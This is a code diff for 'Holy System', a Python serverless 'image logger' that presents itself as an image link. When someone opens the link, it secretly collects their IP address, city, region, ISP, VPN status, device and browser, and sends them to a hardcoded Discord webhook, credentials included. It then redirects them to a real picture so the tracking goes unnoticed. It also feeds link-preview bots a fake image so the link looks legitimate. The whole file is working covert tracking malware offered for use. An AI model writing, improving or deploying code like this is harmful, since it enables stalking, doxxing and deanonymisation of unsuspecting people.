@@ -1,114 +1,92 @@
-# ==========================================
-# Holy System - Discord Image Logger
-# Optimized for Vercel Deployment
-# ==========================================
+# ========================================================
+# Holy System v3.0 - Professional Anti-VPN Image Logger
+# Created for Vercel Serverless Environments
+# Features: Bot Detection, VPN/Proxy Check, Device Info
+# ========================================================
 
 from http.server import BaseHTTPRequestHandler
-from urllib import parse
-import traceback
 import requests
-import base64
 import httpagentparser
+import json
 
-# Configuration Dictionary
-config = {
-    # Replace with your actual Discord Webhook URL
+# --- CONFIGURATION SECTION ---
+CONFIG = {
+    # 1. Your Discord Webhook URL
     "webhook": "https://discord.com/api/webhooks/1457320227212886170/1gwlEi-KBGixKbJZenFYUqD98j_tNENmZY2rS6kxWHQ2ExlgIC3UK7_OW2XVD8eHDVR6",
     
-    # Default image to display
+    # 2. The real image users will see after being logged
     "image": "https://media.discordapp.net/attachments/1457070623238127690/1457320607749509130/images_12.jpg",
     
-    # Customization
-    "username": "Holy Image Logger",
-    "color": 0x00FFFF, # Cyan Hex
-    
-    # Options
-    "buggedImage": True, # Shows a loading fake image to Discord bots
-    "linkAlerts": True,  # Notify when the link is just sent in chat
+    # 3. Webhook appearance
+    "username": "Holy Anti-VPN Logger",
+    "color": 0x00FFFF # Default Cyan color
 }
 
-# Binary for the fake "loading" image shown to Discord
-LOADING_IMAGE = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
-
-def check_if_bot(ip, ua):
-    """Checks if the request is coming from a Discord or Telegram crawler."""
-    if ip and (ip.startswith("34.") or ip.startswith("35.")):
-        return "Discord"
-    if ua and "TelegramBot" in ua:
-        return "Telegram"
-    if ua and "Discordbot" in ua:
-        return "Discord"
-    return False
-
-def post_to_webhook(ip, ua, endpoint="N/A", is_bot=False):
-    """Fetches IP info and sends a formatted embed to Discord."""
-    try:
-        # Fetch geolocation data
-        api_url = f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,isp,proxy,hosting"
-        info = requests.get(api_url, timeout=5).json()
-        
-        # Detect OS and Browser
-        os, browser = httpagentparser.simple_detect(ua)
-        
-        # Determine color and title based on bot status
-        color = config["color"] if not is_bot else 0x7289da
-        title = "📸 User Logged" if not is_bot else "🤖 Link Preview/Bot Detected"
-        
-        payload = {
-            "username": config["username"],
-            "embeds": [{
-                "title": title,
-                "color": color,
-                "description": f"**IP Address:** `{ip}`\n**Location:** `{info.get('country')}, {info.get('city')}`\n**ISP:** `{info.get('isp')}`\n**VPN/Proxy:** `{info.get('proxy')}`\n**OS:** `{os}`\n**Browser:** `{browser}`\n**Endpoint:** `{endpoint}`",
-                "footer": {"text": f"User Agent: {ua}"}
-            }]
-        }
-        
-        requests.post(config["webhook"], json=payload)
-    except Exception:
-        print(traceback.format_exc())
-
 class handler(BaseHTTPRequestHandler):
-    """Vercel requires the class to be named 'handler'."""
-    
     def do_GET(self):
+        """Main request handler for Vercel"""
+        
+        # Capture the visitor's real IP address
+        # 'x-forwarded-for' is required to get the real IP behind Vercel's proxy
+        ip = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
+        user_agent = self.headers.get('user-agent', 'Unknown')
+        
+        # Detect if the visitor is a Discord/Telegram/Twitter bot (Preview bot)
+        is_bot = any(x in user_agent for x in ["Discordbot", "TelegramBot", "Twitterbot", "Slackbot"])
+
         try:
-            # Get real IP from Vercel headers
-            ip = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
-            ua = self.headers.get('user-agent', 'Unknown')
-            path = self.path
+            # ADVANCED GEOLOCATION & VPN DETECTION
+            # Requesting specific fields: proxy (VPN), hosting (Datacenter), and regionName (State/Province)
+            api_url = f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,isp,as,proxy,hosting,mobile"
+            geo = requests.get(api_url, timeout=5).json()
             
-            # Check if it's a bot (Discord/Telegram)
-            bot_type = check_if_bot(ip, ua)
-            
-            if bot_type:
-                # 1. Handle Bot Request (Preview)
-                # We send the loading image to trick Discord into showing a preview
-                self.send_response(200)
-                self.send_header('Content-type', 'image/jpeg')
-                self.end_headers()
-                self.wfile.write(LOADING_IMAGE)
-                
-                if config["linkAlerts"]:
-                    post_to_webhook(ip, ua, endpoint=path, is_bot=True)
-                return
+            # Identify OS and Browser type
+            os, browser = httpagentparser.simple_detect(user_agent)
 
-            else:
-                # 2. Handle Real User Request
-                # Log the data first
-                post_to_webhook(ip, ua, endpoint=path, is_bot=False)
-                
-                # Redirect user to the actual image
-                self.send_response(302)
-                self.send_header('Location', config["image"])
-                self.end_headers()
-                
-        except Exception:
-            # Handle server errors
-            self.send_response(500)
+            # VPN/PROXY ANALYZER
+            # If 'proxy' is True or 'hosting' is True, it's almost certainly a VPN or VPS
+            is_vpn = geo.get('proxy') or geo.get('hosting')
+            vpn_status = "⚠️ VPN/PROXY DETECTED" if is_vpn else "✅ REAL RESIDENTIAL IP"
+            
+            # PREPARE DISCORD EMBED
+            # If VPN is detected, the side-bar color turns Red (0xFF0000)
+            payload = {
+                "username": CONFIG["username"],
+                "embeds": [{
+                    "title": "🛡️ New Log: " + ("Bot Preview" if is_bot else "Real User"),
+                    "color": 0xFF0000 if is_vpn else CONFIG["color"],
+                    "description": f"**VPN Status:** `{vpn_status}`",
+                    "fields": [
+                        {"name": "📍 Location", "value": f"{geo.get('country')}, {geo.get('regionName')}, {geo.get('city')}", "inline": False},
+                        {"name": "🌐 IP Address", "value": f"`{ip}`", "inline": True},
+                        {"name": "📡 ISP/Provider", "value": f"`{geo.get('isp')}`", "inline": True},
+                        {"name": "💻 Device Details", "value": f"OS: `{os}`\nBrowser: `{browser}`", "inline": False},
+                        {"name": "📱 Mobile Data?", "value": "Yes" if geo.get('mobile') else "No", "inline": True}
+                    ],
+                    "footer": {"text": "Holy System v3.0 | Path: " + self.path}
+                }]
+            }
+            
+            # Send the log to Discord Webhook
+            requests.post(CONFIG["webhook"], json=payload)
+
+        except Exception as e:
+            print(f"Logging error: {e}")
+
+        # RESPONSE LOGIC
+        if is_bot:
+            # Send an empty success response to the Discord crawler
+            # This makes Discord believe there is a valid image here
+            self.send_response(200)
+            self.send_header('Content-type', 'image/jpeg')
             self.end_headers()
-            self.wfile.write(b"Internal Server Error")
-            print(traceback.format_exc())
+            self.wfile.write(b"") # Sending empty bytes is enough for a preview
+        else:
+            # Instantly redirect the real human to the target image
+            self.send_response(302)
+            self.send_header('Location', CONFIG["image"])
+            self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
+            self.end_headers()
 
-# Required for Vercel
+# Assigning the handler class to 'app' for Vercel
 app = handler
